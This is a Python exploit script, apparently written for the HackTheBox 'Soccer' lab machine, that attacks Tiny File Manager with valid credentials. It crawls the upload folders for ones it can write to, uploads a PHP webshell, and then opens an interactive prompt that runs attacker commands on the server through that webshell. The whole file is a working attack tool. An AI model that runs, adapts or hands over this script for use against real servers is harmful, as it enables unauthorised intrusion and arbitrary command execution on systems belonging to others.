import requests
from bs4 import BeautifulSoup
import re
import time
import argparse
import signal
import sys

parser = argparse.ArgumentParser(
    description='Tiny File Manager authenticated RCE',
    usage='%(prog)s -rhost victim_url -u user -p password\nExample: %(prog)s -rhost http://soccer.htb -u admin -p admin@123' 
)
parser.add_argument('-rhost', '--remote_host', dest='victim_url', required=True, help='url you are attacking to. Example: http://123.222.233.11 or http://domainname.com')
parser.add_argument('-u', '--user', dest='entered_user', required=True, help='Username for login in. Example: admin')
parser.add_argument('-p', '--password', dest='entered_password', required=True, help='Password for login in. Example: 1234')

args = parser.parse_args()
remote_url = args.victim_url
user = args.entered_user
password = args.entered_password

url_web_root = f'{remote_url}/tiny/'
url_tfm = f'{remote_url}/tiny/tinyfilemanager.php'
url_default_upload = f'{remote_url}/tiny/tinyfilemanager.php?p=&upload'
url_upload_content = f'{remote_url}/tiny/tinyfilemanager.php?p='
url_create_new_folder = f'{remote_url}/tiny/tinyfilemanager.php?p=tiny%2Fuploads&new=test&type=folder'
file_upload_web_root = ''

# req = requests.request(method="GET", url=url)
# print(req.text)

def signal_handler(signum, frame):
    if signum == signal.SIGINT:
        sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
session = requests.Session()


def upload_webshell(url):
    with open('webshell.php', 'rb') as ws:
        webshell_content = ws.read()

        file = {
            "file": ("webshell.php", webshell_content.strip())
        }

        file_name = {
            "fullpath": "webshell.php"
        }

        upload_response = session.request(method="POST", url=url, data=file_name, files=file)
        if upload_response.status_code == 200:
            print("archivo subido")


def retrieve_file_upload_web_root():
    global file_upload_web_root
    upload_site_response = session.request(method='POST', url=url_default_upload)

    soup = BeautifulSoup(upload_site_response.text, 'html.parser')
    folder_info_tag = soup.find('p', class_='card-text')

    if folder_info_tag:
        # Extraer el texto si la etiqueta fue encontrada
        folder_info = folder_info_tag.get_text(strip=True)

        # Utilizar expresiones regulares para extraer el path deseado
        folder_path_match = re.search(r'Destination Folder: (.+)', folder_info)

        if folder_path_match:
            file_upload_web_root = folder_path_match.group(1)
            return True
    return False


def login(user, password):
    creds = {
        "fm_usr": user,
        "fm_pwd": password
    }

    r = session.request(method='POST', url=url_tfm, data=creds)

    if r.status_code == 200 and "Upload" in r.text:
        print("Logged in.")
    else:
        print("Loggin failed. Wrong credentials.")
        sys.exit(0)


def check_upload_files(url, check_all=None):
    folders = []

    # print("Checking uploaded content...")
    check_uploads_response = session.request(method="POST", url=url)

    soup = BeautifulSoup(check_uploads_response.text, 'html.parser')
    upload_table = soup.find('table', class_='table table-bordered table-hover table-sm bg-white')
    upload_table_text = upload_table.get_text(strip=True)
    if not 'Folder is empty' in upload_table_text:
        rows = upload_table.find_all('tr')
        all_rows_with_data = []
        for row in rows:
            cells = row.find_all('td')
            table_files = [cell.get_text(strip=True) for cell in cells]
            all_rows_with_data.append(table_files)

        for row_data in all_rows_with_data:
            for data in row_data:
                if check_all:
                    if "webshell.php" in data:
                        folders.append({"content": (row_data[1], row_data[4])})
                elif data == 'Folder':
                    folders.append({"folder": (row_data[1], row_data[4])})
        return folders
    else:
        print('Nothing uploaded')


def get_webshell_access(web_path):
    craft_webshell_url = remote_url + "/" + web_path + "/webshell.php"
    r = session.request(method='GET', url=craft_webshell_url)
    
    if r.status_code == 200:
        while True:
            command = input('->')

            command_response = session.request(method='GET', url=craft_webshell_url + f'?cmd={command}')
            if command_response.status_code == 200:
                print(command_response.text)
            else:
                print("Commando no valido")

class Spider:

    def __init__(self, url, system_web_root):
        self.url = url
        self.system_web_root = system_web_root
        # Default check
        folders = check_upload_files(self.url)
        if folders:
            self.start_crawling(folders)


    def check_permissions_and_subfolders(self, folder):
        # migth check for suid bit
        last_bit = int(folder['folder'][1][-1])
        if last_bit == 7 or last_bit == 6 or last_bit == 3 or last_bit ==2:
            crafted_url = url_upload_content + folder['folder'][0]
            upload_webshell(crafted_url + '&upload')
            check_upload = check_upload_files(crafted_url, check_all="yes")
            if check_upload:
                print(check_upload)
                get_webshell_access(folder['folder'][0])
                sys.exit(0)
            else:
                print("No se a podido subir la webshell. Probando con mas...")
        return check_upload_files(self.url + folder['folder'][0])


    # Recursive Directory crawling
    def start_crawling(self, folders):
        processed_folders = []
        index = 0
        for f in folders:
            #print(str(index) + "\t" + str(folders[index]) + "\t" + str(folders) + "\t" + str(len(folders)))

            if f in processed_folders:
                index += 1
                continue
            subfolders = self.check_permissions_and_subfolders(f)
            if subfolders:
                processed_folders.append({f['folder'][0]: [*subfolders]})
            index += 1

        new_folders = []
        for item in processed_folders:
            f_name = list(item.keys())[0]
            for sub_f in  item[f_name]:
                new_folders.append({'folder':(f_name + "%2F" + sub_f['folder'][0],sub_f['folder'][1])})
        if new_folders:
            self.start_crawling(new_folders)


# permisos de escritura
# 010 - 2
# 011 - 3
# 110 - 6
# 111 - 7
if __name__ == "__main__":
    buscar_permisos_escritura = False
    print("Triying to login...")
    login(user, password)

    print("Finding upload destiantion path...")
    if retrieve_file_upload_web_root():
        print("System web root dicovered: " + str(file_upload_web_root))

    Spider("http://soccer.htb/tiny/tinyfilemanager.php?p=", file_upload_web_root)

    # print("Triying to upload a webshell in the default folder...")
    # upload_webshell(default_upload_url)
    # print("Creating a new folder...")
    # create_new_folder_response = session.request(method='GET', url=url_create_new_folder)

    # check_upload_files()